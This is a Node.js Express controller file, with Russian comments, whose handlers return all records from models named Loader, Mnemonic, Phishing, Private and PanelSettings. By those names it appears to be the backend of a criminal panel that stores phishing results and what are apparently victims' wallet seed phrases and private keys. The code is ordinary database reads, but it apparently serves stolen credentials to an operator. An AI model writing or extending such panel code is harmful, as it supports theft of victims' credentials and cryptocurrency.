const LoaderModel   = require('../models/LoaderModel');
const MnemonicModel = require('../models/MnemonicModel');
const PhishingModel = require('../models/PhishingModel');
const PrivateModel  = require('../models/PrivateModel');
const PanelModel  = require ('../models/PanelSettings');

class GetController {
    async GetAllFromPanelLoader(req, res) {
        try {
            const data = await LoaderModel.find();
            return res.json(data);

           // const ids = data.map(record => record._id); // Получаем массив всех идентификаторов
           // return res.json(ids); // Возвращаем идентификаторы в ответе
        }
        catch (e) { res.status(400).json({message: e}) }
    }

    async GetAllFromPanelMnemonic(req, res) {
        try {
            const data = await MnemonicModel.find();
            return res.json(data);
        }
        catch (e) { res.status(400).json({message: e}) }
    }

    async GetAllFromPanelPhishing(req, res) {
        try {
            const data = await PhishingModel.find();
            return res.json(data);
        }
        catch (e) { res.status(400).json({message: e}) }
    }

    async GetAllFromPanelPrivate(req, res) {
        try {
            const data = await PrivateModel.find();
            return res.json(data);
        }
        catch (e) { res.status(400).json({message: e}) }
    }

    async GetPanelSettingsById (req, res) {
        try {
            const settings = await PanelModel.find();
            return res.json(settings);
        } catch (e) {
            res.status(500).json({message: e});
        }
    }

}

module.exports = new GetController()
